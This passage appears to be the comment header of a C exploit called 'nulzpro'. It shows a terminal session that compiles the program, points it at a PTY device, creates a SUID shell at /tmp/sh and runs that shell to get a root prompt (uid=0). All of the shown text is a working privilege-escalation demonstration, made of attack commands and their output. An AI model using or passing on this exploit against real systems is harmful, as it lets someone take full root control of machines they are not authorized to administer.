 *  $ gcc nulzpro.c -o nulzpro
 *  $ ./nulzpro /dev/pts/3
 *  [*] Waiting for slave device /dev/pts/3
 *  [+] Got PTY slave /dev/pts/3
 *  [+] Making PTY slave the controlling terminal
 *  [+] SUID shell at /tmp/sh
 *  $ /tmp/sh --norc --noprofile -p
 *  # id
 *  uid=0(root) groups=0(root)
